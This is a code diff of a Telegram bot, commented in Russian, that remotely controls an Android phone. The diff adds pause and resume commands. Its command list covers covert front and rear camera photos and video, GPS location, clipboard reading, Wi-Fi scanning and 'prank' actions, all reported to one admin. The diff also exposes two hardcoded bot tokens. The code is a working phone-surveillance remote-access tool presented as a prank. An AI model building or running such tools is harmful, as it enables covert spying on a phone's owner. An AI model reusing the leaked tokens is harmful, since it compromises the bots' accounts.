@@ -2,12 +2,13 @@ import telebot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
 import subprocess, os, json, time, signal, threading, random
 
-TOKEN = '8733717882:AAFyHqQpFBFVKLOgB6w1WRxqx7_DX9xxg6I'
+TOKEN = '8750288939:AAGJclUgG-B3BLImowWe2EGJHQSJUNPdRvM'
 ADMIN_ID = 6678107119
 PULT_URL = 'https://raw.githack.com/ggfix666-prog/a51-sc-control/main/prank.html'
 
 bot = telebot.TeleBot(TOKEN)
 current_process = None
+PAUSED = False
 
 def is_admin(m): return m.from_user.id == ADMIN_ID
 
@@ -39,8 +40,8 @@ def start(message):
         "/photo /selfie — фото\n"
         "/burst 5 — серия фото задняя\n"
         "/sburst 5 — серия фото фронт\n"
-        "/video 10 — «видео» задняя (сек)\n"
-        "/selfievideo 10 — «видео» фронт (сек)\n"
+        "/video 10 — «видео» задняя\n"
+        "/selfievideo 10 — «видео» фронт\n"
         "/location — GPS\n"
         "/clip — буфер\n"
         "/brightness 50 — яркость\n"
@@ -54,8 +55,29 @@ def start(message):
         "/wifi /wifiscan /toast\n\n"
         "🎭 <b>ПРАНК</b>\n"
         "/prank /ghost /insane\n\n"
+        "⏻ <b>ПИТАНИЕ</b>\n"
+        "/pause — выключить бота (пауза)\n"
+        "/resume — включить бота\n\n"
         "Открой «🎮 Пульт» внизу 👇",
         parse_mode='HTML', reply_markup=prank_kb())
+
+# ── KILL SWITCH ──
+@bot.message_handler(commands=['pause'])
+def pause_cmd(message):
+    global PAUSED
+    PAUSED = True
+    bot.reply_to(message, "⏸ *Бот на паузе.*\nВсе команды игнорируются.\nОтправь /resume для возобновления.", parse_mode='Markdown')
+
+@bot.message_handler(commands=['resume'])
+def resume_cmd(message):
+    global PAUSED
+    PAUSED = False
+    bot.reply_to(message, "▶️ *Бот снова активен.*\nВсе команды работают.", parse_mode='Markdown')
+
+# Глушилка — ловит всё, если PAUSED=True
+@bot.message_handler(func=lambda m: PAUSED and m.text and not m.text.startswith('/resume') and not m.text.startswith('/pause') and not m.text.startswith('/start'))
+def kill_all(message):
+    bot.reply_to(message, "🔒 Бот на паузе.\nНапиши /resume чтобы включить.")
 
 # ── ФОНАРИК-МИГАНИЕ ──
 @bot.message_handler(commands=['flash'])
@@ -109,7 +131,7 @@ def fakecall_cmd(message):
         bot.send_message(message.chat.id, "✅ Звонок завершён")
     threading.Thread(target=_do, daemon=True).start()
 
-# ── LOUD (громкость максимум) ──
+# ── LOUD ──
 @bot.message_handler(commands=['loud'])
 def loud_cmd(message):
     bot.reply_to(message, "🔊 Громкость максимум...")
@@ -340,7 +362,6 @@ def record_cmd(message):
 def _record_video(message, cam_index, sec, label):
     frames_dir = "/sdcard/Download/a51_frames"
     out_path   = "/sdcard/Download/a51_video.mp4"
-
     def _do():
         try:
             os.makedirs(frames_dir, exist_ok=True)
@@ -356,13 +377,10 @@ def _record_video(message, cam_index, sec, label):
             if n < 2:
                 bot.reply_to(message, "❌ Меньше 2 кадров."); return
             subprocess.run([
-                "ffmpeg", "-y",
-                "-framerate", "2",
+                "ffmpeg", "-y", "-framerate", "2",
                 "-i", f"{frames_dir}/f%04d.jpg",
-                "-c:v", "libx264",
-                "-pix_fmt", "yuv420p",
-                "-vf", "scale=1280:-2",
-                out_path
+                "-c:v", "libx264", "-pix_fmt", "yuv420p",
+                "-vf", "scale=1280:-2", out_path
             ], capture_output=True, timeout=120)
             if os.path.exists(out_path) and os.path.getsize(out_path) > 500:
                 with open(out_path, 'rb') as f:
@@ -505,7 +523,7 @@ def insane_cmd(message):
     except Exception as e: bot.reply_to(message, f"Ошибка: {e}")
 
 # ═══════════════════════════════════════════
-#  ОБРАБОТЧИК WEB APP (от prank.html)
+#  ОБРАБОТЧИК WEB APP
 # ═══════════════════════════════════════════
 @bot.message_handler(content_types=['web_app_data'])
 def handle_webapp(message):
@@ -549,6 +567,8 @@ def handle_webapp(message):
         elif cmd == '/flash': flash_cmd(fake)
         elif cmd == '/fakecall': fakecall_cmd(fake)
         elif cmd == '/loud': loud_cmd(fake)
+        elif cmd == '/pause': pause_cmd(fake)
+        elif cmd == '/resume': resume_cmd(fake)
         else: bot.send_message(message.chat.id, f"❓ {raw[:40]}")
     except Exception as e:
         print(f"[WEBAPP] ERROR: {e}")
